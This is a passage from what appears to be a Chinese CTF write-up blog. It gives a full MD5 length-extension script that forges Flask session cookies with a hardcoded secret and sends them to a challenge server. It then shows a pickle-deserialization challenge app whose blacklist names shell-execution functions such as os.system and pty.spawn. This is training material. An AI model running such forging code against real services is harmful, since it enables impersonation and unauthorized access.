class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> md5_to_hex(md5(message, A, B, C, D))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_attack</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>,</span></span><br><span class="line"><span class="params">               D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    <span class="keyword">for</span> chunk_ofst <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">64</span>):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + <span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + <span class="built_in">int</span>.from_bytes(chunk[<span class="number">4</span> * g:<span class="number">4</span> * g + <span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(x &lt;&lt; (<span class="number">32</span> * i) <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_init_values_from_hash_str</span>(<span class="params">real_hash: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        real_hash: 真实的hash结算结果</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns: 哈希初始化值[A, B, C, D]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    str_list: <span class="type">List</span>[<span class="built_in">str</span>] = [real_hash[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="comment"># 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(<span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + s, <span class="number">16</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>), byteorder=<span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> s <span class="keyword">in</span> str_list]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5_attack_materials</span>(<span class="params">origin_msg: <span class="built_in">bytes</span>, key_len: <span class="built_in">int</span>, real_hash: <span class="built_in">str</span>, append_data: <span class="built_in">bytes</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        origin_msg: 原始的消息字节流</span></span><br><span class="line"><span class="string">        key_len: 原始密钥（盐）的长度</span></span><br><span class="line"><span class="string">        real_hash: 计算出的真实的hash值</span></span><br><span class="line"><span class="string">        append_data: 需要添加的攻击数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns: 发起攻击需要的物料信息</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            &#x27;attack_fake_msg&#x27;: bytes([...]),</span></span><br><span class="line"><span class="string">            &#x27;attack_hash_value&#x27;: str(a1b2c3d4...)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    init_values = get_init_values_from_hash_str(real_hash)</span><br><span class="line">    <span class="comment"># print([&#x27;&#123;:08x&#125;&#x27;.format(x) for x in init_values])</span></span><br><span class="line">    <span class="comment"># 只知道key的长度，不知道key的具体内容时，任意填充key的内容</span></span><br><span class="line">    fake_key: <span class="built_in">bytes</span> = <span class="built_in">bytes</span>([<span class="number">0xff</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(key_len)])</span><br><span class="line">    <span class="comment"># 计算出加了append_data后的真实填充数据</span></span><br><span class="line">    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)</span><br><span class="line">    <span class="comment"># 攻击者提前计算添加了攻击数据的哈希</span></span><br><span class="line">    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[<span class="built_in">len</span>(padding_message(fake_key + origin_msg)):],</span><br><span class="line">                                              A=init_values[<span class="number">0</span>],</span><br><span class="line">                                              B=init_values[<span class="number">1</span>],</span><br><span class="line">                                              C=init_values[<span class="number">2</span>],</span><br><span class="line">                                              D=init_values[<span class="number">3</span>]))</span><br><span class="line">    fake_padding_data = padding_message(fake_key + origin_msg)[<span class="built_in">len</span>(fake_key + origin_msg):]</span><br><span class="line">    attack_fake_msg = origin_msg + fake_padding_data + append_data</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;attack_fake_msg&#x27;</span>: attack_fake_msg, <span class="string">&#x27;attack_hash_value&#x27;</span>: attack_hash_value&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">import</span> requests, json, time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session_decode</span>(<span class="params">session_cookie_value, secret_key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">    app = MockApp(secret_key)</span><br><span class="line">    si = SecureCookieSessionInterface()</span><br><span class="line">    s = si.get_signing_serializer(app)</span><br><span class="line">    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session_encode</span>(<span class="params">session_cookie_structure, secret_key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        app = MockApp(secret_key)</span><br><span class="line">        <span class="comment"># session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span></span><br><span class="line">        si = SecureCookieSessionInterface()</span><br><span class="line">        s = si.get_signing_serializer(app)</span><br><span class="line">        <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req_index</span>(<span class="params">url, cookie</span>):</span><br><span class="line">    <span class="comment"># headers = &#123;&quot;Cookie&quot;: &quot;session=&quot; + cookie&#125;</span></span><br><span class="line">    cookies = &#123;<span class="string">&quot;session&quot;</span>:cookie&#125;</span><br><span class="line">    r = requests.get(url, cookies=cookies).text</span><br><span class="line">    <span class="comment"># print(r)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;签到成功&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="comment"># print(cookie)</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        req_index(url, cookie)</span><br><span class="line">        <span class="comment"># print(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req_user</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">return</span> json.loads(requests.get(url).text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req_login</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;student&quot;</span>, <span class="string">&quot;password&quot;</span>:<span class="string">&quot;student&quot;</span>&#125;</span><br><span class="line">    cookie = requests.post(url, data).headers[<span class="string">&quot;Set-Cookie&quot;</span>][<span class="number">8</span>:].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(cookie)</span></span><br><span class="line">    <span class="keyword">return</span> cookie</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_Attack</span>(<span class="params">md5_value, key_len, data, attack_data</span>):</span><br><span class="line">    attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    res = &#123;<span class="string">&quot;username&quot;</span>:attack_data, <span class="string">&quot;msg&quot;</span>:attack_materials[<span class="string">&#x27;attack_fake_msg&#x27;</span>][:-<span class="built_in">len</span>(attack_data)], <span class="string">&quot;sign&quot;</span>:attack_materials[<span class="string">&#x27;attack_hash_value&#x27;</span>].encode()&#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://210.44.150.15:49982/&quot;</span></span><br><span class="line">    cookie = req_login(url+<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">    users = req_user(url+<span class="string">&#x27;users&#x27;</span>)</span><br><span class="line">    secret_key = <span class="string">&quot;Th1s_is_5ecr3t_k3y&quot;</span></span><br><span class="line">    res = session_decode(cookie, secret_key)</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">if</span> users[user] == <span class="number">0</span>:</span><br><span class="line">            res = hash_Attack(res[<span class="string">&quot;sign&quot;</span>], <span class="number">16</span>, res[<span class="string">&quot;msg&quot;</span>]+res[<span class="string">&quot;username&quot;</span>], user.encode())</span><br><span class="line">            res2 = session_encode(res, secret_key)</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line">            r = req_index(url, res2)</span><br></pre></td></tr></table></figure>
<h3 id="Week2-dickle"><a href="#Week2-dickle" class="headerlink" title="[Week2]dickle"></a>[Week2]dickle</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> <span class="type">io</span></span><br><span class="line"></span><br><span class="line"><span class="variable">BLACKLISTED_CLASSES</span> <span class="operator">=</span> [</span><br><span class="line">    <span class="string">&#x27;subprocess.check_output&#x27;</span>,<span class="string">&#x27;builtins.eval&#x27;</span>,<span class="string">&#x27;builtins.exec&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.popen&#x27;</span>, <span class="string">&#x27;os.popen2&#x27;</span>, <span class="string">&#x27;os.popen3&#x27;</span>, <span class="string">&#x27;os.popen4&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;pickle.load&#x27;</span>, <span class="string">&#x27;pickle.loads&#x27;</span>, <span class="string">&#x27;cPickle.load&#x27;</span>, <span class="string">&#x27;cPickle.loads&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;subprocess.call&#x27;</span>, <span class="string">&#x27;subprocess.check_call&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="string">&#x27;commands.getoutput&#x27;</span>, <span class="string">&#x27;commands.getstatus&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;posixfile.open&#x27;</span>, <span class="string">&#x27;posixfile.fileopen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>,<span class="string">&#x27;os.spawn*&#x27;</span>,<span class="string">&#x27;sh.Command&#x27;</span>,<span class="string">&#x27;imp.load_module&#x27;</span>,<span class="string">&#x27;builtins.compile&#x27;</span></span><br><span class="line">    <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;builtins.execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;builtins.open&#x27;</span>, <span class="string">&#x27;builtins.file&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;os.fdopen&#x27;</span>, <span class="string">&#x27;os.tmpfile&#x27;</span>, <span class="string">&#x27;os.fchmod&#x27;</span>, <span class="string">&#x27;os.fchown&#x27;</span>, <span class="string">&#x27;os.open&#x27;</span>, <span class="string">&#x27;os.openpty&#x27;</span>, <span class="string">&#x27;os.read&#x27;</span>, <span class="string">&#x27;os.pipe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.chdir&#x27;</span>, <span class="string">&#x27;os.fchdir&#x27;</span>, <span class="string">&#x27;os.chroot&#x27;</span>, <span class="string">&#x27;os.chmod&#x27;</span>, <span class="string">&#x27;os.chown&#x27;</span>, <span class="string">&#x27;os.link&#x27;</span>, <span class="string">&#x27;os.lchown&#x27;</span>, <span class="string">&#x27;os.listdir&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.lstat&#x27;</span>, <span class="string">&#x27;os.mkfifo&#x27;</span>, <span class="string">&#x27;os.mknod&#x27;</span>, <span class="string">&#x27;os.access&#x27;</span>, <span class="string">&#x27;os.mkdir&#x27;</span>, <span class="string">&#x27;os.makedirs&#x27;</span>, <span class="string">&#x27;os.readlink&#x27;</span>, <span class="string">&#x27;os.remove&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.removedirs&#x27;</span>, <span class="string">&#x27;os.rename&#x27;</span>, <span class="string">&#x27;os.renames&#x27;</span>, <span class="string">&#x27;os.rmdir&#x27;</span>, <span class="string">&#x27;os.tempnam&#x27;</span>, <span class="string">&#x27;os.tmpnam&#x27;</span>, <span class="string">&#x27;os.unlink&#x27;</span>, <span class="string">&#x27;os.walk&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.execl&#x27;</span>, <span class="string">&#x27;os.execle&#x27;</span>, <span class="string">&#x27;os.execlp&#x27;</span>, <span class="string">&#x27;os.execv&#x27;</span>, <span class="string">&#x27;os.execve&#x27;</span>, <span class="string">&#x27;os.dup&#x27;</span>, <span class="string">&#x27;os.dup2&#x27;</span>, <span class="string">&#x27;os.execvp&#x27;</span>, <span class="string">&#x27;os.execvpe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.fork&#x27;</span>, <span class="string">&#x27;os.forkpty&#x27;</span>, <span class="string">&#x27;os.kill&#x27;</span>, <span class="string">&#x27;os.spawnl&#x27;</span>, <span class="string">&#x27;os.spawnle&#x27;</span>, <span class="string">&#x27;os.spawnlp&#x27;</span>, <span class="string">&#x27;os.spawnlpe&#x27;</span>, <span class="string">&#x27;os.spawnv&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.spawnve&#x27;</span>, <span class="string">&#x27;os.spawnvp&#x27;</span>, <span class="string">&#x27;os.spawnvpe&#x27;</span>, <span class="string">&#x27;pickle.load&#x27;</span>, <span class="string">&#x27;pickle.loads&#x27;</span>, <span class="string">&#x27;cPickle.load&#x27;</span>, <span class="string">&#x27;cPickle.loads&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;subprocess.call&#x27;</span>, <span class="string">&#x27;subprocess.check_call&#x27;</span>, <span class="string">&#x27;subprocess.check_output&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="string">&#x27;commands.getoutput&#x27;</span>, <span class="string">&#x27;commands.getstatus&#x27;</span>, <span class="string">&#x27;glob.glob&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;linecache.getline&#x27;</span>, <span class="string">&#x27;shutil.copyfileobj&#x27;</span>, <span class="string">&#x27;shutil.copyfile&#x27;</span>, <span class="string">&#x27;shutil.copy&#x27;</span>, <span class="string">&#x27;shutil.copy2&#x27;</span>, <span class="string">&#x27;shutil.move&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;shutil.make_archive&#x27;</span>, <span class="string">&#x27;popen2.popen2&#x27;</span>, <span class="string">&#x27;popen2.popen3&#x27;</span>, <span class="string">&#x27;popen2.popen4&#x27;</span>, <span class="string">&#x27;timeit.timeit&#x27;</span>, <span class="string">&#x27;sys.call_tracing&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;code.interact&#x27;</span>, <span class="string">&#x27;code.compile_command&#x27;</span>, <span class="string">&#x27;codeop.compile_command&#x27;</span>, <span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;posixfile.open&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;posixfile.fileopen&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SafeUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    def <span class="title function_">find_class</span><span class="params">(self, <span class="keyword">module</span>, name)</span>:</span><br><span class="line">        <span class="keyword">if</span> f<span class="string">&quot;&#123;module&#125;.&#123;name&#125;&quot;</span> in BLACKLISTED_CLASSES:</span><br><span class="line">            raise pickle.UnpicklingError(<span class="string">&quot;Forbidden class: %s.%s&quot;</span> % (<span class="keyword">module</span>, name))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().find_class(<span class="keyword">module</span>, name)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">index</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        encoded_data = request.form[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">        decoded_data = base64.b64decode(encoded_data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data_stream = io.BytesIO(decoded_data)</span><br><span class="line">            unpickler = SafeUnpickler(data_stream)</span><br><span class="line">            result = unpickler.load()</span><br><span class="line">            <span class="keyword">return</span> f<span class="string">&quot;Deserialized data: &#123;list(result)&#125;&quot;</span></span><br><span class="line">        except Exception as e:</span><br><span class="line">            <span class="keyword">return</span> f<span class="string">&quot;Error during deserialization: &#123;str(e)&#125;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;data&quot;&gt;Enter your serialized data:&lt;/label&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;textarea id=&quot;data&quot; name=&quot;data&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<p>这里是pickel反序列化，但是有十分多的waf</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">BLACKLISTED_CLASSES = [</span><br><span class="line">    <span class="string">&#x27;subprocess.check_output&#x27;</span>,<span class="string">&#x27;builtins.eval&#x27;</span>,<span class="string">&#x27;builtins.exec&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.popen&#x27;</span>, <span class="string">&#x27;os.popen2&#x27;</span>, <span class="string">&#x27;os.popen3&#x27;</span>, <span class="string">&#x27;os.popen4&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;pickle.load&#x27;</span>, <span class="string">&#x27;pickle.loads&#x27;</span>, <span class="string">&#x27;cPickle.load&#x27;</span>, <span class="string">&#x27;cPickle.loads&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;subprocess.call&#x27;</span>, <span class="string">&#x27;subprocess.check_call&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="string">&#x27;commands.getoutput&#x27;</span>, <span class="string">&#x27;commands.getstatus&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;posixfile.open&#x27;</span>, <span class="string">&#x27;posixfile.fileopen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>,<span class="string">&#x27;os.spawn*&#x27;</span>,<span class="string">&#x27;sh.Command&#x27;</span>,<span class="string">&#x27;imp.load_module&#x27;</span>,<span class="string">&#x27;builtins.compile&#x27;</span></span><br><span class="line">    <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;builtins.execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;builtins.open&#x27;</span>, <span class="string">&#x27;builtins.file&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;os.fdopen&#x27;</span>, <span class="string">&#x27;os.tmpfile&#x27;</span>, <span class="string">&#x27;os.fchmod&#x27;</span>, <span class="string">&#x27;os.fchown&#x27;</span>, <span class="string">&#x27;os.open&#x27;</span>, <span class="string">&#x27;os.openpty&#x27;</span>, <span class="string">&#x27;os.read&#x27;</span>, <span class="string">&#x27;os.pipe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.chdir&#x27;</span>, <span class="string">&#x27;os.fchdir&#x27;</span>, <span class="string">&#x27;os.chroot&#x27;</span>, <span class="string">&#x27;os.chmod&#x27;</span>, <span class="string">&#x27;os.chown&#x27;</span>, <span class="string">&#x27;os.link&#x27;</span>, <span class="string">&#x27;os.lchown&#x27;</span>, <span class="string">&#x27;os.listdir&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.lstat&#x27;</span>, <span class="string">&#x27;os.mkfifo&#x27;</span>, <span class="string">&#x27;os.mknod&#x27;</span>, <span class="string">&#x27;os.access&#x27;</span>, <span class="string">&#x27;os.mkdir&#x27;</span>, <span class="string">&#x27;os.makedirs&#x27;</span>, <span class="string">&#x27;os.readlink&#x27;</span>, <span class="string">&#x27;os.remove&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.removedirs&#x27;</span>, <span class="string">&#x27;os.rename&#x27;</span>, <span class="string">&#x27;os.renames&#x27;</span>, <span class="string">&#x27;os.rmdir&#x27;</span>, <span class="string">&#x27;os.tempnam&#x27;</span>, <span class="string">&#x27;os.tmpnam&#x27;</span>, <span class="string">&#x27;os.unlink&#x27;</span>, <span class="string">&#x27;os.walk&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.execl&#x27;</span>, <span class="string">&#x27;os.execle&#x27;</span>, <span class="string">&#x27;os.execlp&#x27;</span>, <span class="string">&#x27;os.execv&#x27;</span>, <span class="string">&#x27;os.execve&#x27;</span>, <span class="string">&#x27;os.dup&#x27;</span>, <span class="string">&#x27;os.dup2&#x27;</span>, <span class="string">&#x27;os.execvp&#x27;</span>, <span class="string">&#x27;os.execvpe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.fork&#x27;</span>, <span class="string">&#x27;os.forkpty&#x27;</span>, <span class="string">&#x27;os.kill&#x27;</span>, <span class="string">&#x27;os.spawnl&#x27;</span>, <span class="string">&#x27;os.spawnle&#x27;</span>, <span class="string">&#x27;os.spawnlp&#x27;</span>, <span class="string">&#x27;os.spawnlpe&#x27;</span>, <span class="string">&#x27;os.spawnv&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.spawnve&#x27;</span>, <span class="string">&#x27;os.spawnvp&#x27;</span>, <span class="string">&#x27;os.spawnvpe&#x27;</span>, <span class="string">&#x27;pickle.load&#x27;</span>, <span class="string">&#x27;pickle.loads&#x27;</span>, <span class="string">&#x27;cPickle.load&#x27;</span>, <span class="string">&#x27;cPickle.loads&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;subprocess.call&#x27;</span>, <span class="string">&#x27;subprocess.check_call&#x27;</span>, <span class="string">&#x27;subprocess.check_output&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="string">&#x27;commands.getoutput&#x27;</span>, <span class="string">&#x27;commands.getstatus&#x27;</span>, <span class="string">&#x27;glob.glob&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;linecache.getline&#x27;</span>, <span class="string">&#x27;shutil.copyfileobj&#x27;</span>, <span class="string">&#x27;shutil.copyfile&#x27;</span>, <span class="string">&#x27;shutil.copy&#x27;</span>, <span class="string">&#x27;shutil.copy2&#x27;</span>, <span class="string">&#x27;shutil.move&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;shutil.make_archive&#x27;</span>, <span class="string">&#x27;popen2.popen2&#x27;</span>, <span class="string">&#x27;popen2.popen3&#x27;</span>, <span class="string">&#x27;popen2.popen4&#x27;</span>, <span class="string">&#x27;timeit.timeit&#x27;</span>, <span class="string">&#x27;sys.call_tracing&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;code.interact&#x27;</span>, <span class="string">&#x27;code.compile_command&#x27;</span>, <span class="string">&#x27;codeop.compile_command&#x27;</span>, <span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;posixfile.open&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;posixfile.fileopen&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
